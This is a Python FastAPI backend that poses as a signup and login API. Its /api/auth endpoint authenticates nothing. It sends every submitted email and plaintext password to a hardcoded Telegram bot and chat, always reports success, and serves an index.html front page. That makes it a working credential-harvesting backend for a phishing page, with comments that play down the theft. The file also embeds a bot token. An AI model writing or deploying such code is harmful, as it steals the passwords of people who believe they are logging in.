from fastapi import FastAPI, HTTPException
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import FileResponse
from pydantic import BaseModel
import requests

app = FastAPI()

# --- 1. ENABLE CORS ---
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# --- 2. TELEGRAM CONFIGURATION ---
TELEGRAM_BOT_TOKEN = "8976557269:AAHBCvaPiqrMIgfu8Dk13W0b700Mdy8k5fc"
TELEGRAM_CHAT_ID = "8145643961"

def send_telegram_notification(message: str):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": TELEGRAM_CHAT_ID,
        "text": message,
        "parse_mode": "Markdown"
    }
    try:
        response = requests.post(url, json=payload)
        response.raise_for_status()
    except Exception as e:
        print(f"Failed : {e}")

class UserAuth(BaseModel):
    email: str
    password: str
    action: str  # "signup" or "login"

# --- 3. API ENDPOINT (No Storage) ---
@app.post("/api/auth")
def authenticate_user(user: UserAuth):
    # No database connection or saving happens here.
    # The data is processed only in-memory to send the alert.
    
    if user.action == "signup":
        msg = f"🚀 **New Account Details!**\nEmail: `{user.email}`\nPassword: `{user.password}`"
        send_telegram_notification(msg)
        
    elif user.action == "login":
        msg = f"🔑 **User Login Attempt:**\nEmail: `{user.email}`\nPassword: `{user.password}`"
        send_telegram_notification(msg)

    return {"status": "success", "message": f"{user.action} notification sent successfully"}

# --- 4. SERVE FRONTEND ROUTE ---
@app.get("/")
def serve_frontend():
    return FileResponse("index.html")

# --- 5. RUN THE SERVER PROGRAMMATICALLY ---
if __name__ == "__main__":
    import uvicorn
    uvicorn.run("app:app", host="127.0.0.1", port=8000, reload=True)